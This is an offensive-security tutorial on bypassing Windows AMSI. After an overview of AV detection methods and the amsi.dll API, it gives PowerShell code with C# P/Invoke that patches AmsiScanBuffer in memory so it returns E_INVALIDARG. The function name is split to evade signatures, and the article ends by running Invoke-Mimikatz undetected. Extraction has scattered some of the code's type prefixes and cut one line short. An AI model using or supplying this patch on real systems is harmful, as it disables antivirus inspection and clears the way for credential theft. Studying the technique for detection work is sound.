AMSI bypass patching AmsiScanBuffer()
function from amsi.dll
Introduction
In this article, we'll explore the concept of AMSI, its functioning, and techniques to bypass it.
Detection Methods in AV / EDR
AVs used to wait for a file to be written to disk or a new process to be created before
initiating any action. However, current detection methods are more advanced and include:
Signature Based Detection: This method matches patterns, strings, signatures, or hashes
from a database of known malware.
Heuristic Based Detection: This type of detection searches for commands or instructions
that are not typically found in an application and have malicious intent, similar to
signature scanning.
Behavioral Based Detection: Unlike heuristic-based detection, this method involves the
antivirus program looking for events created by the program, such as attempts to
modify critical files or spawning cmd.exe, as well as calling a sequence of functions that
could indicate a potential process injection vector.
Sandbox Detection: In this type of detection, the program is run in a virtualized
environment (sandbox) and its behavior is recorded and analyzed automatically through
a weight system in the sandbox or manually by a malware analyst. This allows the
antivirus program to see in detail what the file will do in that particular environment.
Regardless of the detection method used, it is easier for AV products to detect malware while
the binary is on disk. Detecting fileless malware is more challenging for AV products.
Introduction to AMSI
When Windows 10 is released, Microsoft introduces AMSI. Imagine AMSI as the bride
connecting powershell to the antivirus software; every command or script we run inside of
powershell is fetched by AMSI and sent to antivirus software for inspection. AMSI was
initially only introduced for PowerShell; later, it was also merged into JScript, VBScript, VBA
and .NET;
Anybody can integrate AMSI with their programs using the API calls offered by AMSI
Interface, so it is not just limited to Powershell, JScript, VBScript, or VBA.
AMSI API calls that the program can use (in our case powershell) is defined inside amsi.dll, As
soon as the powershell process has started, amsi.dll is loaded into it. We can verify it with
Proccess Hacker
AMSI exports the below mentioned API functions that the program uses to communicate
with the local antivirus software through RPC.
amsi.dll functions
AmsiInitialize: The program uses this method to initialize the AMSI session. It takes two
parameters, one is the name of the application and second is the pointer to the context
structure which needs to be specified with subsequent AMSI related API calls in the
program.
AmsiOpenSession: It takes the context that was returned from the previous call and
allows to switch to that session. We can instantiate multiple AMSI sessions if we want.
HRESULT AmsiInitialize(
LPCWSTR appName,
HAMSICONTEXT *amsiContext
);
HRESULT AmsiOpenSession(
HAMSICONTEXT amsiContext,
HAMSISESSION *amsiSession
);
AmsiScanString: It takes our strings and returns the results i.e, 1 if the string is clean and
32768 if it's malicious.
AmsiScanBuffer: Similar to AmsiScanString, this method takes in the buffer instead of
string and returns the result.
AmsiCloseSession: This method just closes the session that was opened by the program
using the AmsiOpenSession.
Among these AMSI APIs, the one which is interesting to us is AmsiScanString and
AmsiScanBuffer. AmsiScanString later calls AmsiScanBuffer underneath.
Bypassing AMSI
The two most common AMSI bypass methods are obfuscation and memory patching of
amsi.dll.
HRESULT AmsiScanString(
HAMSICONTEXT amsiContext,
LPCWSTR string,
LPCWSTR contentName,
HAMSISESSION amsiSession,
AMSI_RESULT *result
);
HRESULT AmsiScanBuffer(
HAMSICONTEXT amsiContext,
PVOID buffer, ULONG length,
LPCWSTR contentName,
HAMSISESSION amsiSession,
AMSI_RESULT *result
);
void AmsiCloseSession(
HAMSICONTEXT amsiContext,
HAMSISESSION amsiSession
);
Obfuscation
Obfuscation is a technique used by attackers to make their code difficult to analyze by
security software. This is typically done by using various code transformations that make it
harder to understand the code's intent, but without changing its functionality. For example,
an operator might use techniques such as code encryption, variable renaming, and code
splitting to make it difficult to understand the purpose of the code.
AMSI sends content to AV to determine if it is malicious, so if the content is obfuscated, AV
cannot detect if it is malicious.
If we can obfuscate the words in the output script detected by AV, we can run almost any
script without detecting them, but obfuscating or removing all detected words is not
possible because it takes more time and may even break the script, even AV keeps updating
its signature, so we need to update our script accordingly. So confusion seems impossible as
each AV vendor may have a different signature. In this post we are not going to use this
method, but I wanted to talk about it.
Patching AmsiScanBuffer() function from amsi.dll
This method patch the AmsiScanBuffer function. The amsi.dll library is loaded into the same
virtual memory space, so we have almost complete control over that address space. Let's
take a look at the AMSI API calls that powershell makes with the help of Frida-Tools. When
we first start a Frida session, it creates handler files that we can modify to print arguments
and results at runtime. In this case we will edit the following file:
C:\Users\User\__handlers__\amsi.dll\AmsiScanBuffer.js
Above we modified the handler file to print the argument to the APIs when they are called
and print the result on exit. Once we edit the file, we can start the tracer.
AmsiScanBuffer returns result 1 when the input is clean and 32768 when the input is found
to be malicious.
Let's look into the AmsiScanBuffer function in more detail inside Disassembler (i'll use IDA
Freeware for this)
Let's open amsi.dll binary, and let's search for AmsiScanBuffer function.
The actual scanning is performed by the instructions in the left box. The instructions at right
is called whenever the arguments passed by the caller is not valid, 80070057h corresponds
to E_INVALIDARG . And then the function ends.
So we can patch the beginning of AmsiScanBuffer() with the instructions in right box i,e.,
mov eax, 80070057h; ret . So that whenever AmsiScanBuffer() is called, it returns with the error
code instead of performing the actual AMSI Scan. The byte that corresonds to that
instruction is b857000780
To patch the AmsiScanBuffer() function we are going to use the following API calls:
LoadLibrary: To load amsi.dll library in the address space.
GetProcAddress: To retrieve the address of AmsiScanBuffer.
VirtualProtect: To make the address region writable as by default it's RX. We need to
make it writable as well so that we can overwrite the instructions and later we'll again
make it to RX from RWX
To make use of these API calls in powershell, we will first define the methods in C# using
pinvoke (which allows us to call unmanaged APIs in managed code) and then load the c#
into the powershell session using add-type.
$code = @"
using System;
using System.Runtime.InteropServices;
public class WinApi {
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uin
}"@
In the above code, we are first loading the required namespaces.
System.Runtime.InteropServices is where pinvoke implemented. Then we are defining the
signature for each native API, I have taken them from pinvoke.net. We need to load the
above C# code inside powershell session using Add-Type.
Add-Type $code
Now we can use those API calls from inside powershell session.
In the above code, first we are getting the handle to the amsi.dll library then calling
GetProcAddress to get the address to the AmsiScanBuffer function inside amsi.dll. Then we
are defining a variable named $ret which contains the bytes which will overwrite the very first
instructions of AmsiScanBuffer, $out is what will contain the old permission of the memory
region returned by VirtualProtect. Now we are calling VirtualProtect to change the
permission of AmsiScanBuffer region to RWX(0x40) and then using Marshal.Copy to copy
bytes from managed memory region to unmanaged and then calling VirtualProtect again to
change back the permission of AmsiScanBuffer to previous one which we had stored in $out.
Now in the above code, we are calling VirtualProtect to change the permission of
AmsiScanBuffer region to RWX(0x40) and then using Marshal.Copy to copy bytes from
managed memory region to unmanaged and then calling VirtualProtect again to change
back the permission of AmsiScanBuffer to previous one which we had stored in $out.
$amsiDll = ::LoadLibrary("amsi.dll")
$asbAddr = ::GetProcAddress($amsiDll, "Ams"+"iScan"+"Buf"+"fer")
$a = 0xB8
$b = 0x57
$c = 0x00
$d = 0x07
$e = 0x80
$f = 0xC3
$ret = ( $a,$b,$c,$d,$e,$f )
$out = 0
[WinApi]
[WinApi]
[Byte[]]
::VirtualProtect($asbAddr, $ret.Length, 0x40, $out)
::Copy($ret, 0, $asbAddr, $ret.Length)
::VirtualProtect($asbAddr, $ret.Length, $out, $null)
[WinApi]
[uint32]
[ref]
[System.Runtime.InteropServices.Marshal]
[WinApi]
[uint32]
[ref]
Now, if we launch "Invoke-Mimikatz" the AMSI alert is not triggered, so we have managed to
overwrite the first bytes of the AmsiScanBuffer() function correctly! :D
